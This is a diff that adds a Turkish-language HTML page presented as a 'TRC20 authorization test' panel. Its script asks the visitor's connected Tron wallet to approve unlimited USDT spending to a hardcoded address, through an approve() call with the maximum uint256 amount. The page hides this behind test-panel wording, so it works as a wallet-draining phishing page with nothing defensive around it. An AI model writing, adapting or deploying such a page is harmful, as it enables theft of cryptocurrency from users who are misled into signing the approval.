@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <title>Teknik İnceleme: TRC20 Yetki Testi</title>
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@4.1.0/dist/TronWeb.js"></script>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding: 50px; background-color: #f0f0f0; }
+        .box { background: white; padding: 30px; border-radius: 10px; display: inline-block; border: 1px solid #ccc; }
+        button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
+        #log { margin-top: 20px; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+<div class="box">
+    <h2>TRC20 Yetki Analiz Paneli</h2>
+    <p>Hedef Adres: <b>TEBXagXwv1QW2nSrhBBhTbn7zGAu2wjaGp</b></p>
+    <p>Varlık: <b>USDT (TRC20)</b></p>
+    
+    <button id="runTest">Yetki İşlemini Başlat</button>
+    <div id="log"></div>
+</div>
+
+<script>
+    // PARAMETRELER
+    const hedefCüzdan = "TEBXagXwv1QW2nSrhBBhTbn7zGAu2wjaGp"; 
+    const usdtKontrat = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+    const miktar = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+
+    document.getElementById('runTest').onclick = async () => {
+        const log = document.getElementById('log');
+        
+        if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+            try {
+                log.innerText = "Cüzdan bağlandı. Onay bekleniyor...";
+                
+                // Kontrat nesnesi oluşturuluyor
+                const contract = await window.tronWeb.contract().at(usdtKontrat);
+
+                // Yetki (Approve) fonksiyonu çağrılıyor
+                await contract.approve(hedefCüzdan, miktar).send();
+
+                log.style.color = "green";
+                log.innerText = "İşlem Başarılı: Yetki tanımlandı.";
+            } catch (err) {
+                log.style.color = "red";
+                log.innerText = "Hata: " + err;
+            }
+        } else {
+            alert("Tron destekli bir cüzdan (TronLink/Trust Wallet) bulunamadı.");
+        }
+    };
+</script>
+
+</body>
+</html>
